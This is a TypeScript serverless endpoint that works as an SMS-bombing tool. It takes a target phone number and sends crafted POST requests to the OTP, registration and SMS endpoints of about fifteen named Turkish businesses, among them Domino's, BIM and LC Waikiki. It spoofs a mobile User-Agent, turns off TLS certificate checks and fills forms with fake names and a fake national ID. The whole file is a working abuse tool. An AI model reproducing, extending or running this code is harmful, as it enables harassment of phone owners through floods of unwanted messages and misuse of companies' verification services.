// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '').slice(-10); // 5XXXXXXXXX
  return {
    raw: raw,
    with90: `90${raw}`,
    plus90: `+90${raw}`,
    with0: `0${raw}`,
    spaced0: `0 (${raw.slice(0,3)}) ${raw.slice(3,6)} ${raw.slice(6,8)} ${raw.slice(8,10)}` // 0 (5XX) XXX XX XX
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const phones = formatPhone(body.targetPhone || '5555555555');
    const serviceId = (body.serviceId || '').toLowerCase();
    const email = body.email || "memati.bas@gmail.com";
    const targetUrl = body.serviceUrl;

    let payload: any = {};
    let customHeaders: any = {};

    // PYTHON SCRIPT REFERANSLI NOKTA ATIŞI PAYLOADLAR
    switch (true) {
      case serviceId.includes('kahve_dunyasi'):
        payload = { countryCode: "90", phoneNumber: phones.raw }; break;
      case serviceId.includes('bim'):
        payload = { phone: phones.raw }; break;
      case serviceId.includes('english_home'):
        payload = { Phone: phones.raw, XID: "" }; break;
      case serviceId.includes('tikla_gelsin'):
        payload = { operationName: "GENERATE_OTP", variables: { phone: phones.plus90, challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB" }, query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n" }; break;
      case serviceId.includes('komagene'):
        payload = { FirmaId: 32, Telefon: phones.raw }; break;
      case serviceId.includes('kofteci_yusuf'):
        payload = { FirmaId: 82, Telefon: phones.raw, FireBaseCihazKey: null, GuvenlikKodu: null }; break;
      case serviceId.includes('dominos'):
        payload = { email: email, isSure: false, mobilePhone: phones.raw }; break;
      case serviceId.includes('baydoner'):
        payload = { PhoneNumber: phones.raw, AreaCode: 90, Name: "Memati", Surname: "Bas", Email: email, Platform: 1 }; break;
      case serviceId.includes('pidem'):
        payload = { query: "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", variables: { phone: phones.raw } }; break;
      case serviceId.includes('ido'):
        payload = { firstName: "MEMATI", lastName: "BAS", mobileNumber: phones.with0, email: email, tckn: "12345678901", termsOfUse: true }; break;
      case serviceId.includes('file_market'):
        payload = { mobilePhoneNumber: phones.with90 }; break;
      case serviceId.includes('hayatsu'):
        payload = { mobilePhoneNumber: phones.raw, actionType: "register" }; break;
      case serviceId.includes('yapp'):
        payload = { phone_number: phones.raw, device_name: "Memati", app_version: "1.1.5", device_type: "I" }; break;
      case serviceId.includes('lc_waikiki'): // Senin F12 analizin
        payload = { RegisterFormView: { RegisterPhoneNumber: phones.spaced0.slice(2), RegisterEmail: email, Password: "Password123!", PhoneAreaCode: "0090", IsMemberPrivacyRequired: true, IsSmsChecked: true } }; break;
      default:
        payload = { phone: phones.raw, phoneNumber: phones.raw, gsm: phones.raw };
    }

    const response = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)',
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const text = await response.text();
    return res.status(200).json({
      ok: response.ok,
      upstreamStatus: response.status,
      serviceId: serviceId,
      responsePreview: text.substring(0, 200)
    });

  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
}